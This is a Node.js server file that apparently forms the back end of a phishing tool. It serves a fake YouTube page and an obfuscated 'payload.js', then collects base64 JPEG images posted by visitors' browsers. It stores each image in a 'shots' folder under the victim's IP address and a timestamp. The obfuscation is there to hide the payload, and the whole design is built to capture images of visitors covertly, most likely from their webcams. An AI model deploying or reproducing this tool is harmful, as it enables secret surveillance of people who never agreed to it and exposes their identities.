const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');
const port = process.env.port || 3000;
const app = express();

const jso = require('javascript-obfuscator');


const preparePayload = (config = {
    compact: false,
    controlFlowFlattening: true,
    controlFlowFlatteningThreshold: 1,
    numbersToExpressions: true,
    simplify: true,
    stringArrayShuffle: true,
    splitStrings: true,
    stringArrayThreshold: 1
}) => {
    const rawPath = path.join(__dirname, '../web/raw.js');
    const payloadPath = path.join(__dirname, '../web/payload.js')
    let content = null;

    try {
        content = fs.readFileSync(rawPath, "utf8");

        const obfuscated = jso.obfuscate(content, config);
        content = obfuscated.getObfuscatedCode();
        console.log("Obfuscated code generated");

        fs.writeFileSync(payloadPath, content);
        console.log('writing to ' + payloadPath);
    } catch (e) {
        console.error("Cant generate obfuscated payload!");
    }

}

preparePayload();

app.set('trust proxy', true)

app.use(function (req, res, next) {
    req.rawBody = '';
    req.setEncoding('utf8');

    req.on('data', function (chunk) {
        req.rawBody += chunk;
    });

    req.on('end', function () {
        next();
    });
});

app.use(bodyParser.raw({
    inflate: true,
    limit: '10mb',
    type: 'application/octet-stream'
}));

app.post('/file', function (req, res) {
    const ip = req.headers['x-forwarded-for'] ||
        req.socket.remoteAddress ||
        null;
    saveImage(req.rawBody, getFilename(ip));
    res.sendStatus(200);
});

app.get('/', function (req, res) {
    res.sendFile(path.join(__dirname, '../web/youtube.html'));
});
app.get('/payload.js', function (req, res) {
    res.sendFile(path.join(__dirname, '../web/payload.js'));
});
app.listen(port, () => {
    console.log(`Started on PORT ${port}`);
})

const getFilename = (ip) => {
    console.log(ip)
    const ts = Date.now().toString();
    return `${ip.toString()}_${ts}.jpeg`;
}

saveImage = (raw, filename) => {
    if (raw.indexOf("image/jpeg;base64") !== -1) {
        const file = path.join(__dirname, '../shots/') + filename;
        const b64img = raw.split("base64,")[1];
        const buff = new Buffer.from(b64img, "base64");
        fs.writeFile(file, buff, function (err) {
            if (err) {
                return console.warn(err);
            }
            console.log(`Saved ${file} : ${buff.length} bytes`);
        });
    }
}

